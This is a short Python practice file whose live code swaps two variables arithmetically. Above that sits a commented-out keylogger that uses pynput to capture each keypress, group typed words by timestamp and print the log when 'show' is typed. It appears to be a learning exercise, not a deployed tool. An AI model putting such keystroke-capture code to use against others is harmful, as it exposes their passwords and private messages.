# from pynput.keyboard import Listener
# import time
# #class KeyLogger:
#
# def key_listening():#f1
#     global word_writen
#     with Listener(on_press=letter_import) as listening:
#         listening.join()
#
# def letter_import(key):#f2
#     global word_writen
#     letter = str(key)
#     final_letter = clear_output(letter)
#     word_writen += final_letter
#     if final_letter == " ":
#         storing_data(timeing())
#         word_writen = ""
#
# def clear_output(letter):#f3
#     letter = letter.replace("'", "") 
#     if letter in ['Key.space', 'Key.enter']:
#         letter = ' '
#     if letter in ["Key.caps_lock" , "Key.shift_r" , "Key.backspace" , "Key.ctrl_l" , "Key.shift"]:
#         letter = ""
#     return letter
#
#
# def storing_data(time_naw):#f4
#     global word_writen
#     global key_logger
#     if time_naw in key_logger:
#         key_logger[time_naw] += word_writen
#     else:
#         key_logger[time_naw] = ""
#         key_logger[time_naw] += word_writen
#     if "show" in key_logger[time_naw]:
#         for time1, value in key_logger.items():
#             print(f"******{time1}******\n{value}")
#         key_logger = {}
#         exit()
#
#
# def timeing():#f5 זה נכנס כפרמטר לפונקציה 4
#      return time.strftime("%d/%m/%y %H:%M", time.localtime())
#
# word_writen = ""
# key_logger = {}
# key_logger[timeing()] = ""
# key_listening()
a = 5
b = 10
a = a + b# a =15
b = a - b# b = 5
a = a - b#a =
print(a,b)
